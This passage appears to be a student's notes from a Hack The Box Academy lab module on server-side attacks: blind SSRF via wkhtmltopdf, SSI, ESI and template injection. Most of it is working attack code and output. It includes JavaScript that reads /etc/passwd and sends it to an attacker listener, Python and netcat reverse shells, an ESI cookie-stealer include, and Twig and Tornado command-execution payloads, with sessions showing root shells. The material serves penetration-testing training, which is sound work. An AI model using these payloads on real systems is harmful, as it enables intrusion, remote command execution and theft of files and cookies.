On the above HTML file, `SERVICE IP` should be a service we own, for example the `VPN/TUN IP` of Pwnbox or your local VM, and `PORT` should be `9090`. And we run netcat accordingly:
```
user@htb[/htb]$ sudo nc -nlvp 9090

Listening on 0.0.0.0 9090
```
After submitting the file, we will receive a message from the web application in the browser and a request to our server revealing the application used to convert the HTML document to PDF.

By inspecting the request, we notice `wkhtmltopdf` in the User-Agent. If we browse [wkhtmltopdf's downloads webpage](https://wkhtmltopdf.org/downloads.html), the below statement catches our attention:

`Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.`

Great, we can execute JavaScript in wkhtmltopdf! Let us leverage this functionality to read a local file by creating the following HTML document.
```html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```
In this case, we are using two [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) objects, one for reading the local file and another one to send it to our server. Also, we are using the `btoa` function to send the data encoded in Base64.

Let us start an HTTP Server, submit the new HTML file, wait for the response, and decode its contents once the HTML file is processed, as follows:
```
user@htb[/htb]$ sudo nc -nlvp 9090

Listening on 0.0.0.0 9090
GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1
Origin: file://
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.14.221:9090
```
Then, we decode the data from Base64:
```
user@htb[/htb]$ echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
In the previous section, we exploited an internal application through SSRF and executed remote commands on the target server. The same internal application (`internal.app.local`) exists in the current scenario. Let us compromise the underlying server, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.

We will use the following reverse shell payload (it is pretty easy to identify that Python is installed once you achieve remote code execution):
```bash
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
Remember, **we need to URL encode our payload**. In this case, we need to encode it twice. The end result will be similar to the below:
```html
export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
```
Test for first if the reverse shell works in your machine (without URL encoding).

Now, let us create an HTML file that performs a GET request to internal.app.local, reaches the local application vulnerable to remote code execution via SSRF, and executes our reverse shell:
```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```
Note: in http.open above I don't need to type the first external service as the previous section because when I upload this `.html` file, the code will be run already inside the context of the exposed web application.

For this exercise on my Academy machine, I used directly the reverse shell used above changing my IP machine because the other reverse shell that I tried didn't work.

Once we start a Netcat listener on our machine and submit the HTML file above, we receive a reverse shell coming from `internal.app.local`:
```
user@htb[/htb]$ nc -nvlp 9090

listening on [any] 9090 ...
Connection received on 10.129.201.238 33100

# whoami

whoami
root
```

## Time-Based SSRF

We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services.

Let us submit the following document to the PDF application of the previous section and observe the response time:
```html
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>
```
![blind_time](https://academy.hackthebox.com/storage/modules/145/img/blind_time.png)

We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that `internal.app.local` was a valid internal application (that we could access through SSRF in the previous section).
![blind_time2](https://academy.hackthebox.com/storage/modules/145/img/blind_time2.png)

In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.

# Server-Side Includes (SSI) Injection

## Server-Side Includes Overview

Server-side includes (`SSI`) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:
```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```
The use of SSI on a web application can be identified by checking for extensions such as `.shtml`, `.shtm`, or `.stm`. That said, non-default server configurations exist that could allow other extensions (such as `.html`) to process SSI directives.

We need to submit payloads to the target application, such as the ones mentioned above, through input fields to test for SSI injection. The web server will parse and execute the directives before rendering the page if a vulnerability is present, but be aware that those vulnerabilities can exist in blind format too. Successful SSI injection can lead to extracting sensitive information from local files or even executing commands on the target web server.

## SSI Injection Exploitation Example

Let us practice SSI Injection against an internet-facing web application. By browsing to the spawned Hack The Box target machine, we come across the below:
![SSI_1](https://academy.hackthebox.com/storage/modules/145/img/SSI_1.png)

Let us focus on identifying an SSI Injection vulnerability by submitting some of the SSI directives mentioned in the previous section.
```html
<!--#echo var="DATE_LOCAL" -->
```
or
```html
<!--#printenv -->
```
**Date**
![SSI_1.5](https://academy.hackthebox.com/storage/modules/145/img/SSI_1.5.png)
![SSI_2](https://academy.hackthebox.com/storage/modules/145/img/SSI_2.png)

**All Variables**
![SSI_3](https://academy.hackthebox.com/storage/modules/145/img/SSI_3.png)
![SSI_4](https://academy.hackthebox.com/storage/modules/145/img/SSI_4.png)

As we can see, the application is indeed vulnerable to SSI Injection! Now, proceed to the exercise at the end of this section and leverage any SSI directives listed in the previous section that can result in command execution against the underlying system to complete it.

Note that, in this case it is not blinded because the input data we submitted is called by the webpage as `Hey YourInputtedName` and `YourInputtedName` will be substituted by the string or the output of SSI directive we submit.

Note: As we saw, running OS commands via SSI on the target application is possible, but who doesn't love shells? Have in mind the following reverse shell payload that will work even against OpenBSD-netcat that doesn't include the execute functionality by default. Also note that you won't be able to obtain a reverse shell in this section's exercise, due to network restrictions!

**Reverse Shell**
```html
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```
* `mkfifo /tmp/foo`: Create a FIFO special file in `/tmp/foo`
* `nc <IP> <PORT> 0</tmp/foo`: Connect to the pentester machine and redirect the standard input descriptor
* `| bin/bash 1>/tmp/foo`: Execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo`
* `rm /tmp/foo`: Cleanup the FIFO file

# Edge-Side Includes (ESI) Injection

## Edge-Side Includes (ESI)

Edge Side Includes (`ESI`) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content, which would be otherwise unstorable through traditional caching protocols. Edge Side Includes (ESI) allow for dynamic web content assembly at the edge of the network (Content Delivery Network, User's Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (XML tags).

ESI tags are used to instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional information regarding a web page with an already cached template. This information may come from another server before rendering the web page to the end-user. ESI enable fully cached web pages to include dynamic content.

Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags by an attacker.

Although we can identify the use of ESI by inspecting response headers in search for `Surrogate-Control: content="ESI/1.0"`, we usually need to use a blind attack approach to detect if ESI is in use or not. Specifically, we can introduce ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible. Some useful ESI tags are:
```html
// Basic detection
<esi: include src=http://<PENTESTER_IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER_IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER_IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
In some cases, we can achieve remote code execution when the application processing ESI directives supports XSLT, a dynamic language used to transform XML files. In that case, we can pass `dca=xslt` to the payload. The XML file selected will be processed with the possibility of performing XML External Entity Injection Attacks (XXE) with some limitations.

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) has created a table to help us understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported. Let us provide some explanations regarding the column names of the below table first:
* Includes: Supports the <esi:includes> directive
* Vars: Supports the <esi:vars> directive. Useful for bypassing XSS Filters
* Cookie: Document cookies are accessible to the ESI engine
* Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
* Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts

| Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
| -------- | -------- | ---- | ------- | ------------------------- | -------------- |
| Squid3 | Yes | Yes | Yes | Yes | No |
| Varnish Cache | Yes | No | No | Yes | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No | No |
| NodeJS esi | Yes | Yes | Yes | No | No |
| NodeJS nodesi | Yes | No | No | No | Optional |

# Server-Side Template Injections

## Introduction to Template Engines

Template engines read tokenized strings from template documents and produce rendered strings with actual values in the output document. Templates are commonly used as an intermediary format by web developers to create dynamic website content. Server-Side Template Injection (`SSTI`) is essentially injecting malicious template directives inside a template, leveraging Template Engines that insecurely mix user input with a given template.

Below you will find some applications that you can run locally to better understand templates. If you are unable to do so, do not worry. The following sections feature exercises with various applications utilizing templates.

Let us now consider the following documents:

**app.py**
```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```

**index.html**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>{{title}}</h1>
    <p>{{content}}</p>
</body>
</html>
```
When we visit the website, we will receive an HTML page containing the values of the title and content variables evaluated inside the double brackets on the template page. Pretty straightforward, and as we can see, the user does not have any control over the variables. What happens when user input enters a template without any validation, though?

**app.py**
```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

@app.route("/hello", methods=['GET'])
def hello():
	name = request.args.get("name")
	if name == None:
		return redirect(f'{url_for("hello")}?name=guest')
	htmldoc = f"""
	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you {name}</a>
	</body>
	</html>
	"""
	return render_template_string(htmldoc)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```
In this case, we can inject a template expression directly, and the server will evaluate it. This is a security issue that could lead to remote code execution on the target application, as we will see in the following sections.

**cURL - Interacting with the Target**
```
user@htb[/htb]$ curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 79
Server: Werkzeug/2.0.2 Python/3.9.7
Date: Mon, 25 Oct 2021 00:12:40 GMT


	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you 49</a> # <-- Expression evaluated
	</body>
	</html>
```
Note that we used `{{7*7}}` because we saw that `index.html` used `{{title}}` and `{{content}}` for evaluating `title` and `content` python variables.

## SSTI Identification

We can detect SSTI vulnerabilities by injecting different tags in the inputs we control to see if they are evaluated in the response. We don't necessarily need to see the injected data reflected in the response we receive. Sometimes it is just evaluated on different pages (blind).

The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:
```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
...
```
We will look for "49" in the response when injecting these payloads to identify that server-side evaluation occurred.

The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include `${{<%[%'"}}%\`. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions.

We can use tools such as [Tplmap](https://github.com/epinna/tplmap) or J2EE Scan (Burp Pro) to automatically test for SSTI vulnerabilities or create a payload list to use with Burp Intruder or ZAP.

The diagram below from [PortsSwigger](https://portswigger.net/research/server-side-template-injection) can help us identify if we are dealing with an SSTI vulnerability and also identify the underlying template engine.
![ssti_diagram](https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png)

In addition to the above diagram, we can try the following approaches to recognize the technology we are dealing with:
* Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used
* Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI
* Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.

Sometimes also using `whatweb` could give as useful information about the used Template engine:

`whatweb -v http://SERVER_IP:PORT`

## SSTI Exploitation Example 1

Suppose that we are pentesting an internet-facing application of Academy Hack The Box target machine. Our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.

Let us submit on the input field mathematical expressions in curly brackets, such as the ones mentioned on the `SSTI Identification` section, starting with `{7*7}`. As answer we get `Hello {7*7}!`.

It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, `${7*7}` this time. As answer we get `Hello ${7*7}!`

It doesn't look like the application evaluated this expression either. What about `{{7*7}}`? As answer we get `Hello 49!`:
![twig6](https://academy.hackthebox.com/storage/modules/145/img/twig6.png)

Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!

As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Let's use PortSwigger's diagram to assist us (shown in the previous section). We already know that the `{{7*7}}` expression was evaluated successfully. The next expression the diagram suggests trying is `{{7*'7'}}`. Let us try it and see how the application responds:
![twig_](https://academy.hackthebox.com/storage/modules/145/img/twig_.png)

The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine.

There are template engine-specific payloads that we can use to determine which of the two is being utilized. Let us try with the below Twig-specific one:
```php
{{_self.env.display("TEST")}}
```
![twig7](https://academy.hackthebox.com/storage/modules/145/img/twig7.png)

The Twig-specific payload was evaluated successfully. A Twig template engine is being utilized on the backend. For an extensive list of template engine-specific payloads, please refer to the following resources:
* [PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

We could have automated the template engine identification process we just executed through [tplmap](https://github.com/epinna/tplmap), as follows. If you didn't notice, the user's input is submitted via the `name` parameter and through a POST request (hence the `-d` parameter in `tplmap`).

**tplmap.py**
```
user@htb[/htb]$ git clone https://github.com/epinna/tplmap.git
user@htb[/htb]$ cd tplmap
user@htb[/htb]$ pip install virtualenv
user@htb[/htb]$ virtualenv -p python2 venv
user@htb[/htb]$ source venv/bin/activate
user@htb[/htb]$ pip install -r requirements.txt
user@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john

[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files
```
Note: I tried to use --os-shell, and I noted that the commands I type return only the last string of the output.

The next step is to gain remote code execution on the target server. Before moving the payload part, it should be mentioned that Twig has a variable `_self`, which, in simple terms, makes a few of the internal APIs public. This `_self` object has been documented, so we don't need to brute force any variable names (more on that in the next SSTI exploitation examples). Back to the remote code execution part, we can use the `getFilter` function as it allows execution of a user-defined function via the following process:

* Register a function as a filter callback via `registerUndefinedFilterCallback`
* Invoke `_self.env.getFilter()` to execute the function we have just registered

**Payload**
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
```
Let's submit the payload using cURL this time:
```
user@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html>
<head>
  <link rel="stylesheet" type="text/css" href="css/default.css" media="screen"/>
  <title>SSTI</title>
</head>
<body>
<div class="container">
  <div class="main">
    <div class="header">
      <div class="title">
        <h1>I'm here to say hello</h1>
      </div>
    </div>
    <div class="content">
 

<a>
    Who are you?
    <form method='post' action=''>
        <div class="form-group"> 
            <input placeholder="Name" name="name" size=70></input> <button class="btn btn-default" type="submit" name='submit'>Send</button>
       </div> 
    </form>
Hello uid=0(root) gid=0(root) groups=0(root)
Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
serversideattackssstitwig-60784-78bd58b5b-pmvvv
serversideattackssstitwig-60784-78bd58b5b-pmvvv!</a>

        </div>    
        <div class="clearer"><span></span></div>
    </div>
    <div class="footer">Break me!</div>
</div>
</body>
```
As we can see in the output/response above, the submitted payload was evaluated, and the specified commands (`id`, `uname -a`, and `hostname`) were executed successfully.

Again, we could have automated the template engine exploitation process we just executed through [tplmap](https://github.com/epinna/tplmap), as follows:
```
user@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell

[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Run commands on the operating system.

Linux $ 
```
We can now execute any command of our choosing through the shell `tplmap` established for us!

Note: When we notice that the mathematical expressions we submit are evaluated, the application may be vulnerable to XSS as well.

Let us test the above statement by submitting an XSS payload inside curly brackets to this section's exercise target. The result of doing so can be seen in the image below:
![twig8](https://academy.hackthebox.com/storage/modules/145/img/twig8.png)

## SSTI Exploitation Example 2

Suppose we are tasked with pentesting yet another internet-facing application. Our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.

For the Academy Hack The Box web application, if you inspect the application's traffic using Firefox's Web Developer Tools (`[Ctrl]`+`[Shift]`+`[I]`), you will notice that user input is submitted inside a parameter called `email` and through a POST request to `http://<TARGET IP>:<PORT>/jointheteam`

Let's submit mathematical expressions in curly brackets to the input field, such as the ones mentioned in the `SSTI Identification` section, starting with `${7*7}`, as PortSwigger's diagram suggests:
```
user@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email ${7*7} has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>
```
It doesn't look like the application evaluated the submitted expression. Let's try `{{7*7}}`:
```
user@htb[/htb]$ curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>
```
The application evaluated the submitted expression this time. Let's continue, as PortSwigger's diagram suggests, to identify the underlying template engine:
```
user@htb[/htb]$ curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>
```
The application evaluated the latest expression we submitted. So, according to the diagram, we should be dealing with a Twig or Jinja2 template engine, right?

Unfortunately, this is not the case! If we submit any Twig or Jinja2-specific payload, the application returns `500: Internal Server Error`. Find some examples of this behavior below.
```
user@htb[/htb]$ curl -X POST -d 'email={{_self.env.display("TEST"}}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

user@htb[/htb]$ curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

user@htb[/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>
```
The payloads we utilized (and more) can be found on [PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) and [HackTricks- SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

It should be straightforward now that no methodology is bulletproof. We could compile a list of template engine-specific payloads from the abovementioned resources and fuzz the application until we conclude on the template engine being used.

Eventually, when submitting [Tornado](https://www.tornadoweb.org/en/stable/guide/templates.html)-specific payloads, we will come across the below:
```
user@htb[/htb]$ curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 0 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>
```
It seems we finally got it! Tornado is being utilized on the backend.

